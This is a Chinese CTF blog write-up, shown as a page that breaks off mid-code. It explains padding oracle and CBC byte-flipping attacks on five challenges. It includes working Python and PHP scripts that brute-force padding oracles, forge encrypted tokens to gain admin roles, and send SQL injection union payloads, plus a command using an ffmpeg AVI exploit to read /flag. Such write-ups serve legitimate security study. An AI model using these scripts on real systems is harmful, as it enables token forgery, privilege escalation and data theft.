<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>padding_oracle 和 cbc字节反转 | ch3n9w の 超元域</title>
<meta name="keywords" content="">
<meta name="description" content="padding oracle 原理: https://www.freebuf.com/articles/database/150606.html">
<meta name="author" content="ch3n9w">
<link rel="canonical" href="https://ch3n9w.github.io/posts/sec-padding-oracle-and-cbc-attack/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://ch3n9w.github.io/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ch3n9w.github.io/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://ch3n9w.github.io/flash.ico">
<link rel="apple-touch-icon" href="https://ch3n9w.github.io/flash.ico">
<link rel="mask-icon" href="https://ch3n9w.github.io/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://ch3n9w.github.io/posts/sec-padding-oracle-and-cbc-attack/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="padding_oracle 和 cbc字节反转" />
<meta property="og:description" content="padding oracle 原理: https://www.freebuf.com/articles/database/150606.html" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ch3n9w.github.io/posts/sec-padding-oracle-and-cbc-attack/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-02-03T16:42:20+00:00" />
<meta property="article:modified_time" content="2020-02-03T16:42:20+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="padding_oracle 和 cbc字节反转"/>
<meta name="twitter:description" content="padding oracle 原理: https://www.freebuf.com/articles/database/150606.html"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ch3n9w.github.io/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "padding_oracle 和 cbc字节反转",
      "item": "https://ch3n9w.github.io/posts/sec-padding-oracle-and-cbc-attack/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "padding_oracle 和 cbc字节反转",
  "name": "padding_oracle 和 cbc字节反转",
  "description": "padding oracle 原理: https://www.freebuf.com/articles/database/150606.html\n",
  "keywords": [
    
  ],
  "articleBody": "padding oracle 原理: https://www.freebuf.com/articles/database/150606.html\n[NPUCTF2020]web狗 打开来看到了源代码\n\u003c?php error_reporting(0); include('config.php'); # $key,$flag define(\"METHOD\", \"aes-128-cbc\"); //定义加密方式 define(\"SECRET_KEY\", $key); //定义密钥 define(\"IV\",\"6666666666666666\"); //定义初始向量 16个6 define(\"BR\",'\n'); if(!isset($_GET['source']))header('location:./index.php?source=1'); #var_dump($GLOBALS); //听说你想看这个？ function aes_encrypt($iv,$data) { echo \"--------encrypt---------\".BR; echo 'IV:'.$iv.BR; return base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR; } function aes_decrypt($iv,$data) { return openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) or die('False'); } if($_GET['method']=='encrypt') { $iv = IV; $data = $flag; echo aes_encrypt($iv,$data); } else if($_GET['method']==\"decrypt\") { $iv = @$_POST['iv']; $data = @$_POST['data']; echo aes_decrypt($iv,$data); } echo \"我摊牌了，就是懒得写前端\".BR; if($_GET['source']==1)highlight_file(__FILE__); ?\u003e 使用padding oracle attack来解出明文内容, 这里比较简单, 明文长度仅仅只有一个分组, 只需要修改iv求出中间值之后和原来的iv进行抑或操作就可以得到明文了, 脚本如下\nimport base64 import requests import time url = \"http://71a04ae9-0b21-46fd-a550-d1aa35a3619a.node3.buuoj.cn/index.php?method=decrypt\u0026source=0\" encrypt = \"ly7auKVQCZWum/W/4osuPA==\" enc = base64.b64decode(encrypt.encode(\"utf8\")) iv = b\"6666666666666666\" get = \"\" for i in range(1, 17): for j in range(0,256): iv_tmp = chr(0)*(16-i) + chr(j) + \"\".join([chr(ord(get[n]) ^ i) for n in range(len(get))]) data = { 'iv':iv_tmp, 'data':encrypt } res = requests.post(url,data=data) print(res.text) time.sleep(1.5) if \"False\" not in res.text: get = chr(j ^ i)+ get print(get) print(base64.b64encode(get.encode(\"utf8\"))) break print(base64.b64encode(get.encode(\"utf8\"))) 得到了一个地址, 访问之发现下一个问题考察cbc字节翻转攻击,题目如下\n\u003c?php #error_reporting(0); include('config.php'); //$fl4g define(\"METHOD\", \"aes-128-cbc\"); define(\"SECRET_KEY\", \"6666666\"); session_start(); function get_iv(){ //生成随机初始向量IV $random_iv=''; for($i=0;$i\u003c16;$i++){ $random_iv.=chr(rand(1,255)); } return $random_iv; } $lalala = 'piapiapiapia'; if(!isset($_SESSION['Identity'])){ $_SESSION['iv'] = get_iv(); $_SESSION['Identity'] = base64_encode(openssl_encrypt($lalala, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $_SESSION['iv'])); } echo base64_encode($_SESSION['iv']).\"\n\"; if(isset($_POST['iv'])){ $tmp_id = openssl_decrypt(base64_decode($_SESSION['Identity']), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, base64_decode($_POST['iv'])); echo $tmp_id.\"\n\"; if($tmp_id ==='weber')die($fl4g); } highlight_file(__FILE__); ?\u003e 脚本, 注意这里需要将字符串补全到16个字节\nimport base64 target = b'weber\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b' orginal = b'piapiapiapia\\x04\\x04\\x04\\x04' iv = base64.b64decode(\"JLSjjNcJ+cOULHUC0DhRSw==\") result = b'' for i in range(16): result += bytes([target[i] ^ iv[i] ^ orginal[i]]) print(base64.b64encode(result)) [CISCN2019 东北赛区 Day2 Web3]Point System 打开是一个登录界面, 访问robots.txt, 发现一个html, 里面是很多api\n试着按照里面的使用方法来注册一个用户, 然后回到登录界面登录提示权限不足, 看看浏览器的network\n除了向login和info都请求了一次, 看看详情\n向login发请求后返回的是\n{\"code\":100,\"data\":{\"token\":\"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9\"}} 向info请求的头中\nCookie: Key=eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWjZsY3ZSbnFBWVpSQmF6Y2UrNVg3dFJJNkdsa3JDVUtaby9qNzJxdnE5TjRHZVNpc2ozQlZZWXZ0OFkzVkZQd2t0SUR5c21DSk10SjdFQWtZSDVTRS93PT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoiTFQ0NXNSOU5SMWpxR0ZsWWJtMUxzeDhWM2l1NEpQT3YiLCJleHBpcmVfaW4iOjE1ODA2Njg5NTF9 请求后返回的是\n{\"code\":100,\"data\":{\"user_role\":3,\"uid\":1}} token解码一下看看\n{\"signed_key\":\"SUN4a1NpbmdEYW5jZVJhUHsFQR4ln5VFC9L09echkYhTWQgiwZohj27JWt98/+1Z6lcvRnqAYZRBazce+5X7tRI6GlkrCUKZo/j72qvq9N4GeSisj3BVYYvt8Y3VFPwktIDysmCJMtJ7EAkYH5SE/w==\",\"role\":3,\"user_id\":1,\"payload\":\"LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv\",\"expire_in\":1580668951} sign_key解码看看\nICxkSingDanceRaP{\u0005A\u001e%E\u000bÒôõç!SY\b\"Á!nÉZß|ÿíYêW/FzaAk7\u001eûûµ\u0012:\u001aY+\tB£øûÚ«êôÞ\u0006y(¬pUaíñÕ\u0014ü$´ò²`2Ò{\u0010\t\u0018\u001fÿ “我蔡徐坤唱跳rap”………….然后后面是乱码, 这个玩意就是cbc加密的特征, 那么signed_key就是cbc加密后经过base64的密文, 还得用padding oracle attack解出明文来\n解密过程:\nC1 ^ 中间值的最后一位 = 0×01 中间值的最后一位 = C1 ^ 0×01 C1 ^ 中间值的最后2位 = 0×02 0x02 中间值的最后2位 = C1 ^ (0×02 0x02) .... 一直到推出整个C2的中间值,和C1异或就得到了C2的明文 同理, 可以破解整个明文\n这是从其他师傅偷过来的脚本\nimport time import requests import base64 import json host = \"938a4575-3337-42bd-b712-45b008d529c5.node3.buuoj.cn\" port = \"\" def padding_oracle(key): user_key_decode = base64.b64decode(key) user_key_json_decode = json.loads(user_key_decode) signed_key = user_key_json_decode['signed_key'] signed_key_decoded = base64.b64decode(signed_key) url = \"http://\" + host + \"/frontend/api/v1/user/info\" N = 16 total_plain = '' for block in range(0, len(signed_key_decoded) // 16 - 1): token = '' get = b\"\" # 对每一块密文 cipher = signed_key_decoded[16 + block * 16:32 + block * 16] # 对每一位 for i in range(1, N+1): # 爆破 for j in range(0, 256): time.sleep(0.1) # 已知位的padding对应的解密异或值 padding = b\"\".join([(get[n] ^ i).to_bytes(1, 'little') for n in range(len(get))]) # 将解密异或值 和 这块密文作为一个signed_key尝试进行解密 c = b'\\x00' * (16 - i) + j.to_bytes(1, 'little') + padding + cipher #print(c) token = base64.b64encode(c) user_key_json_decode['signed_key'] = token.decode(\"utf-8\") header = {'Key': base64.b64encode(bytes(json.dumps(user_key_json_decode), \"utf-8\"))} res = requests.get(url, headers=header) #print(res.text, j) print(res.json()) # 205在测试的时候就是解密不成功, 其他的情况要么是解密成功但是不符合要求和符和要求的 if res.json()['code'] != 205: get = (j ^ i).to_bytes(1, 'little') + get print(get, i) break # 这里存疑, 为什么是不是signed_key_decoded[(block+1)*16 + i]呢 plain = b\"\".join([(get[i] ^ signed_key_decoded[block * 16 + i]).to_bytes(1, 'little') for i in range(N)]) print(plain.decode(\"utf-8\"), \"block=%d\" % block) total_plain += plain.decode(\"utf-8\") print(total_plain) return total_plain plain_text = padding_oracle(\"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9\") print(plain_text) 慢慢的可以跑出来明文, (假装跑出来了, 其实因为buu的防护请求多了直接断开连接, 但是可以跑出几位)\n{\"role\":3,\"user_id\":1,\"payload\":\"LT45sR9NR1jqGFlYbm1Lsx8V3iu4JPOv\",\"expire_in\":1580668951} 那么这个signed_key就是给后面的明文作为一个验证使用.\n之前的那个没有权限登录, 就是这个role的关系, 要把它修改成1 , 就要把密文也修改了, 利用cbc字节反转攻击来修改密文.\n由于要修改的明文只是在第一区块中, 因此只需要修改IV就行了, 设 原明文为PB, 修改后的明文为PA\nC[i] ^ PB[i] = IV[i] C[i] ^ PA[i] = new_IV[i] C[i] = PB[i] ^ IV[i] PB[i] ^ PA[i] ^ IV[i] = new_IV[i] 还是偷来的脚本\n#!/usr/bin/python2.7 # -*- coding:utf8 -*- import requests import base64 import json host = \"dd8b9a48-d183-45ea-831c-2fe0eb2b7e29.node3.buuoj.cn\" def cbc_attack(key, block, origin_content, target_content): user_key_decode = base64.b64decode(key) user_key_json_decode = json.loads(user_key_decode) signed_key = user_key_json_decode['signed_key'] cipher_o = base64.b64decode(signed_key) if block \u003e 0: iv_prefix = cipher_o[:block * 16] else: iv_prefix = '' iv = cipher_o[block * 16:16 + block * 16] cipher = cipher_o[16 + block * 16:] iv_array = bytearray(iv) for i in range(0, 16): iv_array[i] = iv_array[i] ^ ord(origin_content[i]) ^ ord(target_content[i]) iv = bytes(iv_array) user_key_json_decode['signed_key'] = base64.b64encode(iv_prefix + iv + cipher) return base64.b64encode(json.dumps(user_key_json_decode)) def get_user_info(key): r = requests.post(\"http://\" + host + \"/frontend/api/v1/user/info\", headers = {\"Key\": key}) if r.json()['code'] == 100: print(\"获取成功！\") return r.json()['data'] def modify_role_palin(key, role): user_key_decode = base64.b64decode(user_key) user_key_json_decode = json.loads(user_key_decode) user_key_json_decode['role'] = role return base64.b64encode(json.dumps(user_key_json_decode)) print(\"翻转 Key:\") user_key = cbc_attack(\"eyJzaWduZWRfa2V5IjoiU1VONGExTnBibWRFWVc1alpWSmhVSHNGUVI0bG41VkZDOUwwOWVjaGtZaFRXUWdpd1pvaGoyN0pXdDk4LysxWm5GZDFFRDNQZktJWnFnVnpYNW1uNUxFQWlubXJIYmJETVdaTHFrNE9kNTdQNDJqOHhmOVNWRHo3Z2RVVVJzVVVEbUVCWEtJUjU4a0E2K2VuVFZ3NXVRPT0iLCJyb2xlIjozLCJ1c2VyX2lkIjoxLCJwYXlsb2FkIjoibFZva0s2NzVnUjZ5WDFQUTBvMWVoSjJJYmx2MGRsTFgiLCJleHBpcmVfaW4iOjE1ODA2NTQ1MzJ9\", 0, '{\"role\":3,\"user_', '{\"role\":1,\"user_') user_key = modify_role_palin(user_key, 1) print(user_key) print(\"测试拉取用户信息：\") user_info = get_user_info(user_key) print(user_info) 改完后把新的密文作为key访问, 刷新页面, 成功登录, 发现音频上传的功能.看赵师傅wp说上传不同类型的文件然后下载上传的文件(如下图上传后可以在network中发现url), 对比上传前后文件的md5值发现对avi文件有进行处理, 这个姿势学到了.\n猜测后台使用ffmpeg来对音视频进行处理(misc的东西我一点猜不到), 然后使用对应的漏洞\nhttps://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py\npython3 gen_xbin_avi.py file:///flag test.avi 上传, 下载, 播放, 发现flag\n实验吧 简单的登陆题 真难\n# -*- coding:utf-8 -*- from base64 import * import urllib import requests import re def denglu(payload,idx,c1,c2): url=r'http://ctf5.shiyanbar.com/web/jiandan/index.php' payload = {'id': payload} r = requests.post(url, data=payload) Set_Cookie=r.headers['Set-Cookie'] iv=re.findall(r\"iv=(.*?),\", Set_Cookie)[0] cipher=re.findall(r\"cipher=(.*)\", Set_Cookie)[0] iv_raw = b64decode(urllib.unquote(iv)) cipher_raw=b64decode(urllib.unquote(cipher)) lst=list(cipher_raw) lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2)) cipher_new=''.join(lst) cipher_new=urllib.quote(b64encode(cipher_new)) cookie_new={'iv': iv,'cipher':cipher_new} r = requests.post(url, cookies=cookie_new) cont=r.content plain = re.findall(r\"base64_decode\\('(.*?)'\\)\", cont)[0] plain = b64decode(plain) first='a:1:{s:2:\"id\";s:' iv_new='' for i in range(16): iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i])) iv_new = urllib.quote(b64encode(iv_new)) cookie_new = {'iv': iv_new, 'cipher': cipher_new} r = requests.post(url, cookies=cookie_new) rcont = r.content print rcont denglu('12',4,'2','#') denglu('0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'+chr(0),6,'2','u') denglu('0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'+chr(0),7,'2','u') denglu(\"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);\"+chr(0),7,'2','u') denglu(\"0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);\"+chr(0),6,'2','u') 自己的脚本会出现错误\nimport requests import base64 import urllib import re url='http://ctf5.shiyanbar.com/web/jiandan/index.php' post={'id':\"0 2nion select * from((select 1)a join (select 2)b join (select 3)c);\"+chr(0)} responce=requests.post(url,data=post) iv=base64.b64decode(urllib.unquote(re.findall(r\"iv=(.*?),\",responce.headers['Set-Cookie'])[0])) cipher=base64.b64decode(urllib.unquote(re.findall(r\"cipher=(.*)\",responce.headers['Set-Cookie'])[0])) def answer(cipher,old_iv,offset,old_letter,new_letter): cipher=list(cipher) cipher[offset]=chr(ord(old_letter)^ord(new_letter)^ord(cipher[offset])) cipher=''.join(cipher) cookie={'cipher':urllib.quote(base64.b64encode(cipher)),'iv':urllib.quote(base64.b64encode(old_iv))} res=requests.post(url,cookies=cookie) wrong_plain=base64.b64decode(re.findall(r\"base64_decode\\('(.*?)'\\)\",res.content)[0]) new_iv = '' right='a:1:{s:2:\"id\";s:' for i in range(16): new_iv+=chr(ord(old_iv[i])^ord(wrong_plain[i])^ord(right[i])) cookie={'cipher':urllib.quote(base64.b64encode(cipher)),'iv':urllib.quote(base64.b64encode(new_iv))} res=requests.post(url,cookies=cookie) print res.content answer(cipher,iv,7,'2','u') 错误报告如下：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '2)ion select * from((select 1)a join (select 2)b join (select 3)c);' at line 1 也就是说改变的位置发生了变化，但是对另一些payload来说却可以正常运行，很是奇怪，难道是正则表达式的问题? 明白了，正则表达式没有问题，是自己以为前面字段一样序列化之后前面的字段也会一样的原因导致，其实是不一样的 一个偏移位置为6，一个为7，这个正则要好好看看\njavisoj xman 2019 xbitf 源代码如下：\nclass Unbuffered(object): def __init__(self, stream): self.stream = stream def write(self, data): self.stream.write(data) self.stream.flush() def __getattr__(self, attr): return getattr(self.stream, attr) import sys sys.stdout = Unbuffered(sys.stdout) #import signal #signal.alarm(600) import random import time flag=open(\"/root/xbitf/flag\",\"r\").read() from Crypto.Cipher import AES import os def aes_cbc(key,iv,m): handler=AES.new(key,AES.MODE_CBC,iv) return handler.encrypt(m).encode(\"hex\") def aes_cbc_dec(key,iv,c): handler=AES.new(key,AES.MODE_CBC,iv) return handler.decrypt(c.decode(\"hex\")) key=os.urandom(16) iv=os.urandom(16) session=os.urandom(8) token=\"session=\"+session.encode(\"hex\")+\";admin=0\" checksum=aes_cbc(key,iv,token) print token+\";checksum=\"+checksum for i in range(10): token_rcv=raw_input(\"token:\") if token_rcv.split(\"admin=\")[1][0]=='1' and token_rcv.split(\"session=\")[1][0:16].decode(\"hex\")==session: c_rcv=token_rcv.split(\"checksum=\")[1].strip() m_rcv=aes_cbc_dec(key,iv,c_rcv) # 讲解码的结果打印出来 print m_rcv if m_rcv.split(\"admin=\")[1][0]=='1': print flag 解题脚本\nplain = \"session=c3b76cc709a8fddf;admin=0\" checksum=\"92b612cdfa0abf5a415ab73f7f19826853473d7b02378fc836c6248502390b29\" bit = (ord(checksum.decode('hex')[15]) ^ord('0') ^ ord('1')) # 每个16位加密之后都会变成32位，这里要替换第一组的最后一个字节所加密后的内容 checksum_final = checksum[:30] + hex(bit)[2:] + checksum[32:] print checksum_final 在session通过之后就不再对session进行验证了，所以前16位乱码也没有关系。\nbugku login4 这道题由于自己没有认认真真去做，导致做出来花费了很多时间。相关writeup如下：\nhttps://blog.csdn.net/zpy1998zpy/article/details/80684485\nhttps://www.jianshu.com/p/a61756e54f4f\n自己的代码如下：\n\u003c?php $iv='4NyZMJ9AOU5JGstqfld10A%3D%3D'; $cipher='T3tpIgej42eqA3etE61DRqavWBNrphk4dxENvNgSoYUBiB07C5YKCPwtOUm9pZYINeDrM%2BelzJ3sezJaHufNkA%3D%3D'; //username=bdmin password=111 $iv=base64_decode(urldecode($iv)); $cipher=base64_decode(urldecode(($cipher))); $source=array('username'=\u003e'bdmin','password'=\u003e'111'); $plain=serialize($source); $plain1 = substr($plain,0,16); $plain2 = substr($plain,16,16); $cipher[9] = chr(ord($cipher[9])^ord('b')^ord('a')); $new_iv=''; $wrong_plain=base64_decode(\"U0odmU+LM2Bc4HLVCFql2G1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjExMSI7fQ==\"); for($i=0;$i\u003c16;$i++){ $new_iv.=chr(ord($wrong_plain[$i])^ord($plain1[$i])^ord($iv[$i])); } echo urlencode(base64_encode($new_iv)).' '.urlencode(base64_encode($cipher)); ",
  "wordCount" : "1041",
  "inLanguage": "en",
  "datePublished": "2020-02-03T16:42:20Z",
  "dateModified": "2020-02-03T16:42:20Z",
  "author":{
    "@type": "Person",
    "name": "ch3n9w"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ch3n9w.github.io/posts/sec-padding-oracle-and-cbc-attack/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w の 超元域",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ch3n9w.github.io/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ch3n9w.github.io/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
                <img src="https://ch3n9w.github.io/sabito.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w の 超元域</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://ch3n9w.github.io/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://ch3n9w.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://ch3n9w.github.io/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      padding_oracle 和 cbc字节反转
    </h1>
    <div class="post-meta"><span title='2020-02-03 16:42:20 +0000 UTC'>February 3, 2020</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;1041 words&nbsp;·&nbsp;ch3n9w

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#npuctf2020web狗">[NPUCTF2020]web狗</a></li>
    <li><a href="#ciscn2019-东北赛区-day2-web3point-system">[CISCN2019 东北赛区 Day2 Web3]Point System</a></li>
    <li><a href="#实验吧-简单的登陆题">实验吧 简单的登陆题</a></li>
    <li><a href="#javisoj-xman-2019-xbitf">javisoj xman 2019 xbitf</a></li>
    <li><a href="#bugku-login4">bugku login4</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>padding oracle 原理: <a href="https://www.freebuf.com/articles/database/150606.html">https://www.freebuf.com/articles/database/150606.html</a></p>
<h2 id="npuctf2020web狗">[NPUCTF2020]web狗<a hidden class="anchor" aria-hidden="true" href="#npuctf2020web狗">#</a></h2>
<p>打开来看到了源代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span>(<span style="color:#e6db74">&#39;config.php&#39;</span>);   <span style="color:#75715e"># $key,$flag
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;METHOD&#34;</span>, <span style="color:#e6db74">&#34;aes-128-cbc&#34;</span>);  <span style="color:#75715e">//定义加密方式
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;SECRET_KEY&#34;</span>, $key);    <span style="color:#75715e">//定义密钥
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;IV&#34;</span>,<span style="color:#e6db74">&#34;6666666666666666&#34;</span>);    <span style="color:#75715e">//定义初始向量 16个6
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">define</span>(<span style="color:#e6db74">&#34;BR&#34;</span>,<span style="color:#e6db74">&#39;&lt;br&gt;&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;source&#39;</span>]))<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;location:./index.php?source=1&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#var_dump($GLOBALS);   //听说你想看这个？
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">aes_encrypt</span>($iv,$data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;--------encrypt---------&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">BR</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;IV:&#39;</span><span style="color:#f92672">.</span>$iv<span style="color:#f92672">.</span><span style="color:#a6e22e">BR</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">openssl_encrypt</span>($data, <span style="color:#a6e22e">METHOD</span>, <span style="color:#a6e22e">SECRET_KEY</span>, <span style="color:#a6e22e">OPENSSL_RAW_DATA</span>, $iv))<span style="color:#f92672">.</span><span style="color:#a6e22e">BR</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">aes_decrypt</span>($iv,$data)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">openssl_decrypt</span>(<span style="color:#a6e22e">base64_decode</span>($data),<span style="color:#a6e22e">METHOD</span>,<span style="color:#a6e22e">SECRET_KEY</span>,<span style="color:#a6e22e">OPENSSL_RAW_DATA</span>,$iv) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;False&#39;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#39;method&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;encrypt&#39;</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    $iv <span style="color:#f92672">=</span> <span style="color:#a6e22e">IV</span>;
</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> $flag;    
